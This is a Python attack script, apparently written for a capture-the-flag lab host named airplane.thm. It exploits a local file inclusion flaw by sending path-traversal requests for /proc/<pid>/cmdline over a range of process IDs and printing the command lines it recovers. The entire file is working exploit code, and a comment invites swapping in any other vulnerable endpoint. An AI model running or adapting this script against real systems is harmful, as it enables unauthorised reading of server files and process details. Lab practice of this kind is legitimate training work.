import requests
import time

# 🔧 CONFIGURATION
TARGET_URL = "http://airplane.thm:8000/?page="  # Replace with the actual vulnerable endpoint
SLEEP_BETWEEN_REQUESTS = 0.01  # Time between requests (in seconds)
PID_RANGE = range(520, 1000)     # Tune this to scan more PIDs
def get_cmdline(pid):
    target = f"{TARGET_URL}../../../../../proc/{pid}/cmdline"
    try:
        response = requests.get(target, timeout=5)
        print(f"[+] Trying PID {pid} => Status {response.status_code}")
        if response.status_code == 200:
            content = response.text.strip()
            if "Page not found" in content or len(content) < 5:
                pass
            else:
                clean = content.replace('\\x00', ' ').strip()
                print(f"    [FOUND] PID {pid} CMDLINE: {clean}")
                return clean
        else:
            print(f"    [?] Unexpected status: {response.status_code}")
    except requests.RequestException as e:
        print(f"[!] Error on PID {pid}: {e}")
    return None
def main():
    print(f"[*] Starting LFI /proc/<pid>/cmdline enumeration on {TARGET_URL}")
    for pid in PID_RANGE:
        get_cmdline(pid)
        time.sleep(SLEEP_BETWEEN_REQUESTS)
if __name__ == "__main__":
    main()
